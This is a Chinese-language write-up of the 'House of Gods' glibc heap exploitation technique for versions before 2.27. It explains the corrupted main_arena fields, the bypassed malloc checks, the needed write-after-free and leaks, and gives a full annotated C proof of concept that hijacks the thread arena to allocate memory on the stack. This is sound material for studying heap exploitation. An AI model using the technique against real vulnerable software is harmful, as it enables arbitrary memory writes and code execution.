# 漏洞利用文档：House of Gods

## 攻击对象
- **main_arena的binmap字段**：位于main_arena结构体偏移0x855处（例如，在调试中main_arena地址为0x7ffff7dd1b20，则binmap位于0x7ffff7dd2375）。binmap值被设置为0x200，用作fake chunk的size字段，以绕过unsorted bin的size检查。
- **main_arena.next指针**：位于main_arena偏移0x868处（例如，0x7ffff7dd2388）。该指针最初指向main_arena自身，被修改为指向攻击者控制的fake arena地址（如INTM-0x10），用于劫持arena链表。
- **narenas全局变量**：位于libc中的数据段（例如，在调试中地址为0x7ffff7dd1148）。该变量被unsorted bin攻击修改为一个极大的值（如unsorted bin的head地址），以触发arena重用机制。
- **unsorted bin**：通过修改free chunk的bk指针，构建恶意链，指向binmap-chunk和narenas变量，用于进行unsorted bin攻击和分配控制。

## 利用过程
1. **初始分配**：分配多个chunk（SMALLCHUNK、FAST20、FAST40、INTM）来准备堆布局，获取heap和libc地址泄露。
2. **binmap crafting**：释放SMALLCHUNK到unsorted bin，然后分配INTM触发binning过程，使SMALLCHUNK移到smallbin，同时binmap被设置为0x200（一个有效的size值）。
3. **write-after-free**：重新分配SMALLCHUNK，再次释放到unsorted bin，并利用写后释放漏洞修改其bk指针，指向binmap-chunk（main_arena + 0x7f8）。
4. **构建恶意链**：释放FAST20和FAST40，并预先修改FAST40的bk指针，构建一个恶意的unsorted bin链（head → SMALLCHUNK → binmap → main-arena → FAST40 → INTM）。
5. **分配binmap-chunk**：通过分配请求（0x1f8大小）从unsorted bin中分配BINMAP-chunk，获得对main_arena字段（如system_mem和next）的控制。
6. **unsorted bin攻击**：修改INTM的bk指针指向narenas-0x10，然后分配INTM触发unsorted bin攻击，将narenas变量修改为unsorted bin的head地址。
7. **修改main_arena.next**：通过BINMAP写入，修改main_arena.next指针指向fake arena地址（如INTM-0x10）。
8. **触发reused_arena**：两次大malloc调用（请求大小0xffffffffffffffc0）触发reused_arena()函数，第一次设置thread_arena为main_arena，第二次设置为main_arena.next（fake arena）。
9. **任意地址分配**：使用fake arena分配chunk到任意地址（如栈上），演示任意内存读写。

## 利用条件
- **write-after-free漏洞**：存在对unsorted bin中free chunk的写后释放漏洞，用于修改bk指针（源码中明确要求"a single write-after-free bug on an unsorted chunk"）。
- **地址泄露**：需要heap地址泄露（用于计算fake arena地址）和libc地址泄露（用于定位main_arena和narenas），通过读取unsorted bin的fd/bk指针获取。
- **分配控制**：能够分配至少8个chunk（源码中提到"8 allocs of arbitrary size"），以操作堆布局。
- **glibc版本**：适用于glibc < 2.27（测试于glibc-2.23到2.26），因为arena管理机制在2.27后有变化。

## 利用效果
- **任意地址分配**：通过控制fake arena，可以分配chunk到任意地址（如栈、堆、数据段），实现任意内存读写（PoC中演示了在栈上分配chunk并修改数据）。
- **控制流劫持潜力**：任意地址写可以覆盖函数指针、GOT表、hook函数等，最终实现代码执行（源码中提到"escalate further to arbitrary code execution"是简单的）。
- **arena hijacking**：劫持thread_arena符号，使后续所有内存分配由攻击者控制的fake arena处理，完全掌握堆管理。

## 涉及缓解机制
Glibc中的堆元数据检查机制在此利用中被绕过，相关源码或伪代码包括：
- **unsorted bin unlink检查**：在malloc.c的_int_malloc函数中，当从unsorted bin取chunk时，会验证bk->fd == victim。如果失败，触发"malloc(): corrupted unsorted chunks"错误。
  ```c
  // 伪代码基于glibc源码
  victim = unsorted_chunks (av)->bk;
  bck = victim->bk;
  if (__glibc_unlikely (bck->fd != victim))
    malloc_printerr ("malloc(): corrupted unsorted chunks");
  ```
  利用中通过构建恶意链（如bk指向main_arena自身）绕过此检查。
- **size检查**：chunk的size必须对齐、合理（例如，不小于MINSIZE），且不超过system_mem。在_int_malloc中：
  ```c
  size = chunksize (victim);
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr("malloc(): invalid size");
  if (__glibc_unlikely (size > av->system_mem))
    malloc_printerr("malloc(): memory corruption");
  ```
  利用中binmap值0x200被用作size字段（看似有效），并修改system_mem为极大值（0xffffffffffffffff）来绕过检查。
- **arena重用检查**：在reused_arena()函数中，会检查narenas是否超过narenas_limit，如果超过则遍历arena链表。利用中通过unsorted bin攻击设置narenas为大值，触发重用。

## Proof of Concept
以下为PoC源码，添加中文注释解释关键步骤：

```c
/* House of Gods PoC */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>

int main(void) {
    printf("=================\n");
    printf("= House of Gods =\n");
    printf("=================\n\n");

    // 初始分配：准备堆布局，获取必要chunk
    void *SMALLCHUNK = malloc(0x88); // 分配0x90大小的small chunk，用于后续操作
    void *FAST20 = malloc(0x18);     // 分配0x20大小的fast chunk，用于构建链
    void *FAST40 = malloc(0x38);     // 分配0x40大小的fast chunk，用于构建链

    free(SMALLCHUNK); // 释放SMALLCHUNK到unsorted bin，以便获取libc地址泄露
    const uint64_t leak = *((uint64_t*) SMALLCHUNK); // 读取unsorted bin的fd指针，泄露libc地址（main_arena相关）

    void *INTM = malloc(0x98); // 分配INTM（0xa0大小），触发binning：SMALLCHUNK从unsorted bin移到0x90-smallbin，同时设置binmap为0x200

    SMALLCHUNK = malloc(0x88); // 重新分配SMALLCHUNK，从smallbin中回收
    free(SMALLCHUNK); // 再次释放SMALLCHUNK到unsorted bin，为write-after-free做准备

    // write-after-free漏洞利用：修改SMALLCHUNK的bk指针，指向binmap-chunk（main_arena + 0x7f8）
    *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8;

    // 预先修改FAST40的bk指针，指向INTM-0x10，为后续unsorted bin攻击构建链
    *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10);

    free(FAST20); // 释放FAST20到fastbin，用于后续链构建
    free(FAST40); // 释放FAST40到fastbin，但其bk指针已修改，影响unsorted bin链

    // 分配BINMAP-chunk：请求0x1f8大小，从unsorted bin中分配binmap-chunk，获得对main_arena字段的控制
    void *BINMAP = malloc(0x1f8);

    // unsorted bin攻击准备：修改INTM的bk指针指向narenas-0x10（narenas全局变量地址减0x10）
    *((uint64_t*) (INTM + 0x8)) = leak - 0xa40;

    // 修改main_arena.system_mem字段为极大值（0xffffffffffffffff），绕过size检查（防止chunk size超过system_mem）
    *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff;

    // 触发unsorted bin攻击：分配INTM，导致narenas变量被修改为unsorted bin的head地址
    INTM = malloc(0x98);

    // 修改main_arena.next指针，指向fake arena地址（这里使用INTM-0x10作为fake arena）
    *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10);

    // 第一次大malloc调用：请求0xffffffffffffffc0大小，触发reused_arena()，设置thread_arena为当前main_arena
    malloc(0xffffffffffffffbf + 1);

    // 第二次大malloc调用：再次请求大小时，触发reused_arena()，设置thread_arena为main_arena.next（fake arena）
    malloc(0xffffffffffffffbf + 1);

    // 现在thread_arena被劫持到fake arena，可以進行任意地址分配
    uint64_t fakechunk[4] = {0, 0x73, 0x4141414141414141, 0}; // 在栈上构造一个fake chunk（size 0x73）
    *((uint64_t*) (INTM + 0x20)) = (uint64_t) fakechunk; // 将fake chunk地址放入fake arena的fastbin（0x70大小bin）

    void *FAKECHUNK = malloc(0x68); // 分配0x70大小的chunk，返回栈上的fakechunk地址
    *((uint64_t*) FAKECHUNK) = 0x4242424242424242; // 修改fakechunk的数据，演示任意写能力

    assert(fakechunk[2] == 0x4242424242424242); // 验证写入成功，证明任意地址分配有效
    return EXIT_SUCCESS;
}
```